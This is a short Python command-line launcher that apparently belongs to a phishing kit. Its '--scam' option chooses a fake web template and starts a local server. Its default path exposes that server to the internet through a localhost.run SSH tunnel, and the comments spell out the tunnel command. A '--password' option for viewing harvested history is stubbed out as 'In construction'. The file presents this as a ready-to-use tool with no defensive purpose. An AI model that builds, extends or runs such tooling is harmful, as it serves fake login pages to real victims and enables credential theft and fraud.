import click
import subprocess
from scripts import props

@click.command()
@click.option("--scam"    , '-s', default="None" , 
                help="Web template name.   \033[92mpython my_soup.py -s Name\033[0m")
@click.option("--password", '-p', default=False,  
                help="View action history. \033[92mpython my_soup.py -p True\033[0m")
@click.option("--info",     '-i', default=False,
                help="View info tools.     \033[92mpython my_soup.py -i True\033[0m")

def main(scam, password, info):
    if (scam != "None"):
        subprocess.call(['python3', './scripts/server.py', '--scam', scam])

    elif (password):
        print("In construction")

    elif (info):
        print(props.INFO)

    else:
        option = props.banner()
        port = props.port()
        subdomain = props.localhost_run()

        if (subdomain != None):
            subprocess.call(['bash', './scripts/open.sh', option, port, subdomain])
        
        else:
            subprocess.call(['python3', './scripts/server.py', '-s', option, '-p', port])


if __name__ == "__main__":
    main()  


#  konsole --noclose -e python3 ./scripts/server.py -s option -p port 
#| konsole --noclose -e ssh -R 80:localhost:8080 test.localhost.run 